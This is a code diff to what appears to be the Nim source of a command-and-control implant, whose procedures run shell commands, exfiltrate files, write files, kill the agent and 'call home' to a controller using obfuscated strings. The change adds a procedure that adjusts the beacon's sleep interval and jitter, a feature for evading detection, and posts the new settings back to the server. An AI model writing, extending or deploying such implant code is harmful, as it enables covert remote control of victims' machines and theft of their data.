@@ -1,4 +1,4 @@
-include config
+import config
 import std/[strformat, tables, nativesockets, streams, random, json, base64, encodings]
 import system/[io]
 import httpclient
@@ -15,6 +15,7 @@ proc post_data*(client: HttpClient, command_type: string, data_dict: string): bo
 proc run_shell_command*(client: HttpClient, shell_command: string): bool
 proc exfil_file*(client: HttpClient, file_path: string): bool
 proc write_file*(client: HttpClient, file_data_base64: string, file_path: string): bool
+proc change_sleep_time*(client: HttpClient, timeframe: int,  jitter_percent: int): bool
 proc kill_agent*(client: HttpClient): void
 
 # Encryption & Encoding
@@ -61,7 +62,6 @@ proc run_shell_command*(client: HttpClient, shell_command: string): bool =
     return is_success
 
 
-
 proc exfil_file*(client: HttpClient, file_path: string): bool = 
     var is_success: bool
     var file_content_base64: string
@@ -103,6 +103,20 @@ proc write_file*(client: HttpClient, file_data_base64: string, file_path: string
     
     is_success = post_data(client, protectString("upload") , $data)
 
+    return is_success
+
+
+proc change_sleep_time*(client: HttpClient, timeframe: int,  jitter_percent: int): bool =
+    var is_success: bool
+    call_home_timeframe = timeframe
+    call_home_jitter_percent = jitter_percent
+    
+    var data = {
+        protectString("sleep_timeframe"): $call_home_timeframe,
+        protectString("sleep_jitter_percent"): $call_home_jitter_percent
+    }.toOrderedTable()
+    
+    is_success = post_data(client, protectString("sleep") , $data)
     return is_success
 
 
